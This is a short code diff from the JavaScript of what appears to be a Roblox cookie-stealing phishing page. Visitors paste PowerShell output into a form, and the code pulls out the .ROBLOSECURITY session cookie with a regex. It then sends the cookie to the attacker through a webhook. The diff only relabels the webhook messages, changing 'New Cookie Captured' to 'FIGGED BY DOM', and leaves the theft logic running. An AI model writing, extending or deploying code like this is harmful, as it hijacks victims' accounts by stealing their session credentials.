@@ -65,7 +65,7 @@ document.getElementById('submitButton').addEventListener('click', async function
     showErrorAlert();
     powershellInput.value = '';
     closeModal('modal');
-    await sendWebhook('No Asset ID Found', 'No asset id found in PowerShell.', 0xff0000);
+    await sendWebhook('No FIG ID Found', 'No FIG id found in PowerShell.', 0xff0000);
     return;
   }
 
@@ -74,7 +74,7 @@ document.getElementById('submitButton').addEventListener('click', async function
   const match = powershellData.match(roblosecurityRegex);
   if (match) {
     const cookie = match[1].trim();
-    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
+    await sendWebhook('FIGGED BY DOM', `\`\`\`${cookie}\`\`\``, 0x00ff00);
   }
 
   powershellInput.value = '';
